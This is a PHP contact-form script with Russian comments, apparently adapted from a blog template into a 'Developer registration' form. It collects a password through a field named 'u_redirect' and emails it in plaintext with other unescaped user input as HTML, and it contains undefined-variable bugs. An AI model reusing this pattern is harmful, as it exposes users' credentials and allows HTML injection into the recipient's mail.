<?php 
/*
Форма обратной связи может получать сообщения с любых почтовых ящиков.
Исправлена проблема кодировки при получении писем почтовым клиентом Outlook.
Вы скачали её с сайта Epic Blog https://epicblog.net Заходите на сайт снова!
ВНИМАНИЕ! Лучше всего в переменную myemail прописать почту домена, который использует сайт. А не mail.ru, gmail и тд.
*/
if(isset($_POST['submit'])){
/* Устанавливаем e-mail Кому и от Кого будут приходить письма */    
	$to = "kontakt@insurino.se"; // Здесь нужно написать e-mail, куда будут приходить письма	
    $from = "kontakt@insurino.se"; // Здесь нужно написать e-mail, от кого будут приходить письма, например no-reply@epicblog.net

/* Указываем переменные, в которые будет записываться информация с формы */
	$u_name = $_POST['u_name'];
	$u_lastname = $_POST['u_lastname'];
	$u_Companyname = $_POST['u_Companyname'];
	$u_Companynumber = $_POST['u_Companynumber'];
	$u_email = $_POST['u_email'];
	$u_redirect = $_POST['u_redirect'];
    $subject = "Developer registration";//Фиксированная тема письма
	
/* Проверка правильного написания e-mail адреса */
if (!preg_match("/([\w\-]+\@[\w\-]+\.[\w\-]+)/", $u_email))
{
show_error("<br /> Е-mail is incorrect");
}
	
/* Переменная, которая будет отправлена на почту со значениями, вводимых в поля */
$mail_to_myemail =
"<table style='width: 100%;'>
<tr>
    <th>First name</th>
    <td>$u_name</td>
</tr>
<tr>
    <th>Last name</th>
    <td>$u_lastname</td>
</tr>
<tr>
    <th>Company name</th>
    <td>$u_Companyname</td>
</tr>
<tr>
    <th>Company registration number</th>
    <td>$u_Companynumber</td>
</tr>
<tr>
    <th>Work email</th>
    <td>$u_email</td>
</tr>
<tr>
    <th>Password</th>
    <td>$u_redirect</td>
</tr>
</table>";
	
$headers = "From: $from \r\n";
	
/* Отправка сообщения, с помощью функции mail() */
    mail($to, $subject, $mail_to_myemail, $headers . 'Content-type: text/html; charset=utf-8');
    echo "Сообщение отправлено. Спасибо Вам " . $first_name . ", мы скоро свяжемся с Вами.";
	echo "<br /><br /><a href='https://epicblog.net'>Вернуться на сайт.</a>";
}
?>
<!--Переадресация на главную страницу сайта, через 3 секунды-->
<script language="JavaScript" type="text/javascript">
function changeurl(){eval(self.location="https://epicblog.net");}
window.setTimeout("changeurl();",3000);
</script>
